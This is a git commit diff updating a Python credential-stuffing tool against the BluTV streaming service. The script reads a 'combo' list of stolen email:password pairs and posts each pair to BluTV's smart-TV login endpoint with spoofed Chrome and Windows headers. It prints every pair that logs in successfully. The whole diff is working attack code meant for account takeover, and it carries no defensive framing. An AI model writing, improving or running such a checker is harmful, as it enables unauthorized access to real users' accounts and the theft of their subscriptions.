2bbfc3e10b3c253cedfcb3aa04af0df652806b4d
R1CK <arthurbyhacked@gmail.com>
2024-11-09 21:30:25 +0300

    Update R1CK-BLUTV.py

--- R1CK-BLUTV.py
+++ R1CK-BLUTV.py
@@ -7,38 +7,34 @@ except:
 
 class RickLoginChecker:
     def __init__(self):
-        self.url = "https://www.blutv.com/api/login"
+        self.url = "https://smarttv.blutv.com.tr/actions/account/login"
         self.headers = {
-            'authority': 'www.blutv.com',
-            'accept': '*/*',
-            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'appcountry': 'TUR',
-            'applanguage': 'tr-TR',
-            'appplatform': 'com.blu',
-            'content-type': 'text/plain;charset=UTF-8',
-            'deviceresolution': '393x873',
+            'deviceid': 'Windows:Chrome:94.0.4606.71',
+            'deviceresolution': '1366x768',
+            'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.blutv.com',
-            'referer': 'https://www.blutv.com/giris',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
+            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'userip': '188.57.45.192'
+            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'
         }
 
     def login_check(self, email, password):
-        json_data = {
-            "email": email,
-            "password": password,
-            "remember": False,
-        }
-        response = requests.post(self.url, headers=self.headers, json=json_data)
-        if "Lütfen e-posta adresi ve şifreni kontrol edip tekrar dene." in response.text:
-            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")
-        elif "accessToken" in response.text:
+        data = f"username={email}&password={password}&platform=com.blu.smarttv"
+        response = requests.post(self.url, data=data, headers=self.headers)
+        
+        # API yanıtını JSON formatında almak
+        try:
+            response_json = response.json()  # Yanıtı JSON olarak alıyoruz
+        except ValueError:
+            print(f"\033[1;31mYanıt JSON formatında değil ❌: {email}:{password}")
+            return
+
+        # Yanıtın 'status' ve 'user' alanlarına göre kontrol yapıyoruz
+        if response_json.get("status") == "ok" and response_json.get("user", {}).get("OK"):
             print(f"\033[2;32mBaşarılı Giriş ✅: {email}:{password}")
         else:
             print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")
@@ -49,8 +45,10 @@ class RickLoginChecker:
                 email, password = line.strip().split(":")
                 self.login_check(email, password)
 
+# Başlangıç mesajı
 output = render('    RICK     BLU TV ', colors=['white', 'blue'], align='center')
 print(output)
+
 combo_yolu = input("\033[2;35mCombo Yolu: ")
 
 checker = RickLoginChecker()
